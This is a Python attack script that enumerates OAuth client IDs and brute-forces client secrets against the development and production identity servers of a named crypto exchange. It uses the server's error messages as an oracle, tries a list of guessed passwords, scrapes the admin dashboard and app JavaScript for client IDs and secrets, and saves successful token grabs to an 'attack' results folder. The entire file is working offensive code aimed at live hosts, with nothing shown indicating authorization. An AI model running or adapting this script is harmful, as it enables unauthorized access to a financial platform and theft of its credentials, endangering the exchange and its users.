import requests, json, sys, urllib3, re, time
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 15

H = {"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"}

def safe(t, n=400):
    return t[:n].encode('ascii','replace').decode('ascii') if t else ""

found_clients = {}

print("=" * 70)
print("MX EXCHANGE — CLIENT_ID ENUMERATION + SECRET BRUTE")
print("=" * 70)

# Phase 1: Enumerate client_ids using error oracle
# invalid_client = doesn't exist OR wrong secret
# invalid_grant = exists! (grant type issue)
# invalid_scope = exists! (scope issue)
# 200 = JACKPOT

IDENTITY_HKDEV = "https://identityhkdev.mx.exchange"
IDENTITY_PROD = "https://identity.mx.exchange"

client_ids = [
    # Standard IdentityServer4
    "spa", "web", "webapp", "angular", "react", "admin", "mobile",
    "api", "backend", "service", "internal", "system", "server",
    # MX Exchange specific
    "mx", "mx.web", "mx.admin", "mx.mobile", "mx.api", "mx.service",
    "mxexchange", "mx-exchange", "mx_exchange", "mxglobal",
    "MxExchange", "MxExchange.Web", "MxExchange.Admin", "MxExchange.Mobile",
    "MxExchange.Api", "MxExchange.Service", "MxExchange.Broker",
    "mx.exchange.web", "mx.exchange.admin", "mx.exchange.api",
    # Orca (admin dashboard title)
    "orca", "orca-admin", "orca-web", "orca-api", "orca.admin",
    "OrcaAdmin", "Orca.Admin", "orca_admin",
    # Service names from architecture
    "account", "account-service", "accountApi", "account.api",
    "wallet", "wallet-service", "walletApi", "wallet.api",
    "orderbook", "orderbook-service", "orderBookApi", "orderbook.api",
    "notification", "notification-service", "notificationApi",
    "common", "common-service", "commonApi", "common.api",
    "broker", "broker-service", "brokerApi", "broker.api",
    "identity", "identity-service", "identityApi",
    # Admin/internal
    "admin-spa", "admin-web", "admin-api", "admin_spa", "admin_web",
    "backoffice", "back-office", "dashboard", "console",
    "superadmin", "super-admin", "root", "master",
    # Mobile
    "mobile-app", "ios", "android", "app", "native",
    "mx-mobile", "mx-app", "exchange-app",
    # Broker
    "broker-client", "broker-spa", "broker-web",
    # DevOps/internal
    "swagger", "swagger-ui", "openapi", "test", "dev", "staging",
    "ci", "cd", "pipeline", "worker", "scheduler", "cron",
    # Crypto specific
    "trading", "exchange", "bitgo", "custody",
    "cokeeps", "cksdk", "onfido",
    # Common defaults
    "client", "default", "public", "confidential",
    "ro.client", "resourceowner", "password-client",
    "implicit-client", "code-client", "device",
    "m2m", "machine", "service-account",
    # With numbers
    "spa1", "spa2", "web1", "admin1", "client1",
    "mx1", "mx2", "api1", "api2",
]

# Deduplicate
client_ids = list(dict.fromkeys(client_ids))

secrets = ["secret", "Secret", "SECRET", "spa-secret", "admin-secret", 
           "P@ssw0rd", "password", "Password1", "MxExchange", "mxglobal",
           "mx2024", "mx2025", "mx2026", "orca", "Orca2024",
           "client_secret", ""]

print(f"\n[Phase 1] Testing {len(client_ids)} client_ids with 'secret'...")
print(f"  Oracle: invalid_client=NO | invalid_grant/invalid_scope/200=YES")

for env, base in [("HKDEV", IDENTITY_HKDEV), ("PROD", IDENTITY_PROD)]:
    print(f"\n  --- {env} ---")
    for cid in client_ids:
        if cid == "spa":
            continue  # already known
        
        r = requests.post(f"{base}/connect/token", data={
            "client_id": cid, "client_secret": "secret",
            "grant_type": "client_credentials",
        }, headers=H, timeout=T, verify=False)
        
        if r.status_code == 200:
            print(f"  [!!!] {cid}:secret => 200 TOKEN!")
            found_clients[f"{env}_{cid}"] = {"secret": "secret", "response": r.json()}
        elif "invalid_client" not in r.text:
            print(f"  [???] {cid}:secret => {r.status_code} {safe(r.text, 200)}")
            # Try more secrets for this client
            for sec in secrets:
                if sec == "secret":
                    continue
                r2 = requests.post(f"{base}/connect/token", data={
                    "client_id": cid, "client_secret": sec,
                    "grant_type": "client_credentials",
                }, headers=H, timeout=T, verify=False)
                if r2.status_code == 200:
                    print(f"    [!!!] {cid}:{sec} => 200 TOKEN!")
                    found_clients[f"{env}_{cid}"] = {"secret": sec, "response": r2.json()}
                    break
                elif "invalid_client" not in r2.text:
                    print(f"    [?] {cid}:{sec} => {r2.status_code} {safe(r2.text, 150)}")

# Phase 2: Search admin dashboard JS for different client_id
print(f"\n\n[Phase 2] Admin dashboard JS scan...")
ADMIN = "https://admin-hkdev.mx.exchange"
try:
    r = requests.get(f"{ADMIN}/", headers={"User-Agent":"Mozilla/5.0"}, timeout=T, verify=False)
    if r.status_code == 200:
        scripts = re.findall(r'src="([^"]*\.js[^"]*)"', r.text)
        print(f"  Found {len(scripts)} JS files in admin:")
        for s in scripts:
            print(f"    {s}")
        
        for js_url in scripts:
            if js_url.startswith("/"):
                js_url = f"{ADMIN}{js_url}"
            if "polyfill" in js_url or "zone" in js_url:
                continue
            try:
                r2 = requests.get(js_url, headers={"User-Agent":"Mozilla/5.0"}, timeout=T, verify=False)
                if r2.status_code == 200 and len(r2.text) > 1000:
                    # Search for client_id, secrets, identity URLs
                    for pat, label in [
                        (r'client_id["\s:=\']+([a-zA-Z0-9._\-]+)', "client_id"),
                        (r'clientId["\s:=\']+([a-zA-Z0-9._\-]+)', "clientId"),
                        (r'client_secret["\s:=\']+([a-zA-Z0-9._\-!@#$%^&*]+)', "client_secret"),
                        (r'identity[\s":=\']+([a-zA-Z0-9._\-:/]+)', "identity"),
                        (r'stsServer[\s":=\']+([a-zA-Z0-9._\-:/]+)', "stsServer"),
                        (r'authority[\s":=\']+([a-zA-Z0-9._\-:/]+)', "authority"),
                        (r'"([a-zA-Z0-9._-]+)":\s*\{[^}]*client', "config_block"),
                    ]:
                        matches = re.findall(pat, r2.text)
                        if matches:
                            unique = list(set(matches))[:10]
                            fname = js_url.split("/")[-1][:30]
                            print(f"  [{fname}] {label} => {unique}")
            except:
                continue
except Exception as e:
    print(f"  ERROR: {e}")

# Phase 3: Deep search main.js for OTHER environment configs
print(f"\n\n[Phase 3] Deep main.js config extraction...")
try:
    r = requests.get("https://app.mx.exchange/main.a9f9f1eacd481f95.js", 
                     headers={"User-Agent":"Mozilla/5.0"}, timeout=30, verify=False)
    if r.status_code == 200:
        text = r.text
        # Find ALL string constants that look like client_ids
        # Pattern: "key":"value" where value could be a client_id
        configs = re.findall(r'"((?:client|ident|auth|api|token|grant|scope|secret|redirect|sts|issuer)[^"]*)":\s*"([^"]*)"', text, re.IGNORECASE)
        seen = set()
        for key, val in configs:
            pair = f"{key}={val}"
            if pair not in seen and len(val) > 0 and len(val) < 200:
                seen.add(pair)
                print(f"  {key} = {val}")
        
        # Also find environment blocks
        env_blocks = re.findall(r'(\{[^{}]{0,500}(?:identity|client_id|IdentityApi|stsServer)[^{}]{0,500}\})', text)
        for block in env_blocks[:10]:
            clean = block.encode('ascii','replace').decode('ascii')
            if len(clean) > 30:
                print(f"\n  [CONFIG] {clean[:500]}")
except Exception as e:
    print(f"  ERROR: {e}")

# Save
with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\client_enum_results.json", "w") as f:
    json.dump(found_clients, f, indent=2, ensure_ascii=True)

print(f"\n{'='*70}")
print(f"FOUND CLIENTS: {len(found_clients)}")
for k, v in found_clients.items():
    print(f"  {k}: secret={v['secret']}")
print("=" * 70)
